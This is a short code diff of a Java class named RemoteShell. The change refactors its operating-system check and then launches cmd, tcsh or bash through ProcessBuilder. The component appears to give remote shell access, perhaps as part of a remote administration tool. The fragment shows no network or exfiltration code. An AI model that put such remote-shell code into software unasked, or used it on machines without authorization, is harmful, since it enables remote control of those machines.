@@ -18,14 +18,14 @@ public class RemoteShell extends Thread {
 			
 			String shell;
 			
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				shell = "cmd";
-			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.FREEBSD || OperatingSystem.getOperatingSystem() == OperatingSystem.OPENBSD || OperatingSystem.getOperatingSystem() == OperatingSystem.NETBSD) {
+			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.BSD) {
 				shell = "/bin/tcsh";
 			} else {
 				shell = "/bin/bash";
 			}
-			
+						
 			ProcessBuilder builder = new ProcessBuilder(shell);
 			builder.redirectErrorStream(true);
 			p = builder.start();
